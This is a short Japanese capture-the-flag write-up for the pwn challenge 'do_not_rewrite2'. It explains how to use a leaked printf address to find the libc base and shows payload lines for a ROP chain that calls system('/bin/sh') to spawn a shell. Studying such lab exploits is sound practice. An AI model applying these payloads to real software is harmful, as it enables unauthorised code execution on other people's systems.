# My solution for do_not_rewrite2

## 方針

実行ファイルのセキュリティ機構を確認．
- RELRO: Full RELRO
- STACK CANARY: Canary found
- NX: NX enabled
- PIE: PIE enabled

`do_not_rewrite`であった`show_flag()`がなくなっているため，ROPで`system("/bin/sh")`を実行してFLAGを取得することを目指す．

## 解法

ヒントとして`printf`のアドレスが与えられるため，この値からlibcのベースアドレスを求める．  
`libc_base_addr = printf_addr - libc.symbols['printf']`

RDIレジスタに`"/bin/sh"`をセットして`system()`を呼び出す．  
`payload += p64(libc_base_addr + pop_rdi_ret)`  
`payload += p64(libc_base_addr + next(libc.search(b"/bin/sh\x00")))`  
`payload += p64(libc_base_addr + libc.sym["system"])`

ただしスタックのアライメントのため，最初に`ret`を追加する．  
`payload = p64(libc_base_addr + ret)`

詳細は [solve.py](./solve.py) を参照．

## メモ

与えられた`libc.so.6`でバイナリを実行するために  
`./pwninit --bin chall --libc libc.so.6`

## 参考リンク

- [ROP - Return Oriented Programing](https://book.hacktricks.xyz/v/jp/binary-exploitation/rop-return-oriented-programing)

- [pwninit](https://github.com/io12/pwninit)